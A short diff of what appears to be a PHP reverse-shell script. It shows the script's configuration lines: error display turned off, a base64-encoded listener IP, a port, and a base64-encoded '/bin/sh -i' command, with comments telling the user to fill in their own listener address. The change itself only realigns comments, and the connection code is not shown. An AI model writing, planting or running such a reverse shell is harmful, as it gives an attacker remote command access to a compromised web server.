@@ -4,8 +4,8 @@
 @ini_set('display_errors', 0);
 
 
-$ip_b64     = 'MTkyLjE2OC4xLjU=';        // change this to your base64 encoded IP Address
-$port       = 222;                       // change this to your listener port
+$ip_b64     = 'MTkyLjE2OC4xLjU=';  // change this to your base64 encoded IP Address
+$port       = 222;                 // change this to your listener port
 $shell_b64  = 'L2Jpbi9zaCAtaQ==';        
 
 
